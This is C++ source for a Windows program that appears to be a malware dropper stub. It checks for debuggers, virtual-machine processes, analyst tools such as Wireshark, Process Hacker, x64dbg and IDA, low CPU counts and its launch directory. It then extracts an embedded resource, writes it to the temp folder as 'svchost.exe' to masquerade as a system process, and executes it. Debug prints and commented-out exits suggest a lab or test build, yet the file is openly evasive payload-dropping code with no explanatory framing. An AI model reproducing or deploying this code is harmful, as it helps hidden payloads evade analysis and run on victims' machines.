#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <cstring>
#include <string.h>
#include <strsafe.h>
#include <stdlib.h>
#include <Processthreadsapi.h>
#include <array>
#include <wchar.h>
#include <string>
#pragma comment(lib, "User32.lib")
#define DIV 1024
using namespace std;

STARTUPINFOA si;
PROCESS_INFORMATION pi;
HANDLE ps;
PROCESSENTRY32 psinfo;

int exit()
{
	HANDLE hSelf = GetCurrentProcess();
	TerminateProcess(hSelf, 0);
	return 0;
}

int dbgchk()
{
	BOOL flag = IsDebuggerPresent();
	if (flag != 0)
	{
		return 1;
	}
	else
	{
		return 0;
	}

}

int sysinfo()
{
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	int numCPU = sysinfo.dwNumberOfProcessors;
	if (numCPU < 2)
	{
		return 2;
	}
	MEMORYSTATUSEX mem;
	mem.dwLength = sizeof(mem);
	GlobalMemoryStatusEx(&mem);
	/*		---- FIX THIS CODEBLOCK!
	if (mem.ullTotalVirtual < 2147483648)
	{
		return 1;
	}
	else
	{
		return 0;
	}
	*/
	return 0;
}

int pschk()
{
	ps = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	psinfo.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(ps, &psinfo))
	{
		int err = GetLastError();
		printf("Process32First Error: %d", err);
	}
	else
	{
		std::array<std::string, 10> procs;
		procs = { "vmacthlp.exe", "vmtoolsd.exe", "ProcessHacker.exe", "Procmon",  "Regshot", "ollydbg.exe", "x32dbg", "x64dbg", "ida", "Wireshark"};

		while (Process32Next(ps, &psinfo))
		{
			WCHAR* s = psinfo.szExeFile;
			wstring ws(s);
			string strProc(ws.begin(), ws.end());
			for (int i = 0; i < 10; i++)
			{
				if (strProc.find(procs[i]) != std::string::npos)
				{
					return 1;
				}
			}
		}
		CloseHandle(ps);
	}
	return 0;
}

int appschk()
{
	WIN32_FIND_DATAW w32fd;
	HANDLE hFind;
	hFind = FindFirstFileW(L"C:\\Program Files\\*", &w32fd);

	if (INVALID_HANDLE_VALUE == hFind)
	{
		cout << "FindFirstFile: INVALID HANDLE" << endl;
	}

	while (FindNextFileW(hFind, &w32fd))
	{
		WCHAR* s = w32fd.cFileName;
		if (wcsstr(s, L"Wireshark") || wcsstr(s, L"Process Hacker"))
		{
			return 1;
		}

	}
	return 0;

	if (ERROR_NO_MORE_FILES != GetLastError())
	{
		cout << "NO MORE FILES IN DIR" << endl;
	}
	FindClose(hFind);
	return 0;
}

int dirchk()
{
	LPSTR cmdline = GetCommandLineA();
	if (strstr(cmdline, "\\AppData\\Local\\Temp\\"))
	{
		return 0;
	}
	else
	{
		return 1;
	}
}

int exec()
{
	HRSRC hRsc = FindResourceExW(NULL, RT_RCDATA, MAKEINTRESOURCE(101), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
	if (hRsc == 0)
	{
		int err = GetLastError();
		cout << "FindResource Error: " << err << endl;
	}
	else
	{
		HGLOBAL hData = LoadResource(NULL, hRsc);
		if (hData == 0)
		{
			int err = GetLastError();
			cout << "LoadResource Error: " << err << endl;
		}
		else
		{
			DWORD sizeRsc = SizeofResource(NULL, hRsc);
			TCHAR tmpPathBuff[MAX_PATH];
			GetTempPathW(MAX_PATH, tmpPathBuff);
			lstrcat(tmpPathBuff, L"\svchost.exe");
			//wcout << L"Temp Path: " << tmpPathBuff << endl;
			HANDLE hExe = CreateFileW(tmpPathBuff, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hExe == 0)
			{
				int err = GetLastError();
				cout << "CreateFile Error: " << err << endl;
			}
			else
			{
				if (WriteFile(hExe, hData, sizeRsc, NULL, NULL))
				{
					CloseHandle(hExe);
					ZeroMemory(&si, sizeof(si));
					si.cb = sizeof(si);
					ZeroMemory(&pi, sizeof(pi));
					BOOL bProc = CreateProcessW(tmpPathBuff, NULL, (LPSECURITY_ATTRIBUTES)NULL, (LPSECURITY_ATTRIBUTES)NULL, (BOOL)FALSE, (DWORD)CREATE_NEW_CONSOLE, (LPVOID)NULL, NULL, (LPSTARTUPINFOW)&si, (LPPROCESS_INFORMATION)&pi);
					if (bProc == 0)
					{
						CloseHandle(hExe);
						int err = GetLastError();
						cout << "CreateProcess Error: " << err << endl;
					};
					return 1;
				}
				else
				{
					CloseHandle(hExe);
					int err = GetLastError();
					cout << "WriteFile Error: " << err << endl;
				}
				
			}
			CloseHandle(hExe);
		}
	}
	return 0;
}
int main()
{
	if (dirchk())
	{
		cout << "Exit: Wrong directory!" << endl; // return 1 if not running out of temp directory
		//exit();
	}
	else if (dbgchk()) // return 1 if dbgflag is set, 0 if not
	{
		cout << "Exit: Debugger detected!" << endl;
		//exit();
	}
	else if (appschk()) // return 1 if installed tool in program files
	{
		cout << "Exit: Analyst tool installed!" << endl;
		//exit();
	}
	else if (sysinfo() == 2) // return 2 if low processor count
	{
		cout << "Exit: Low process count" << endl;
		//exit();
	}
	else if (sysinfo() == 1) // return 1 if low ram
	{
		//cout << "Exit: Low RAM" << endl;
	}
	else if (pschk()) // return 1 if analyst tool is in process listing
	{
		cout << "Exit: Analyst tool running!" << endl;
		//exit();
	}
	exec();
}
